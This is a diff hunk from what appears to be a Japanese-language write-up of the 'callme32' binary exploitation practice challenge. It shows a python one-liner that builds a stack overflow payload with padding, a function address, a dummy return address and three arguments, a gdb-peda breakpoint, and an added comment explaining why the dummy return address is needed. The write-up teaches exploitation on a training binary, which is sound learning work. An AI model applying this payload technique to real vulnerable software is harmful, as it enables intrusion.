@@ -81,6 +81,7 @@ $ objdump -d -M intel libcallme32.so > libcallme32.dis
 
 ```shell
 $ python -c 'print "A" * 44 + "\xb0\x85\x04\x08" + "A" * 4 + "\x01\x00\x00\x00" + "\x02\x00\x00\x00" + "\x03\x00\x00\x00"' > input.txt
+# "A" * 4 というのはcallme_threeのreturnアドレス、このようにダミーでもいいのでreturnアドレスを置いておかないと、引数が上手く渡ってくれない
 $ gdb callme32
 
 gdb-peda$ b *0x0804880b # pwnmeのretにBreakpoint
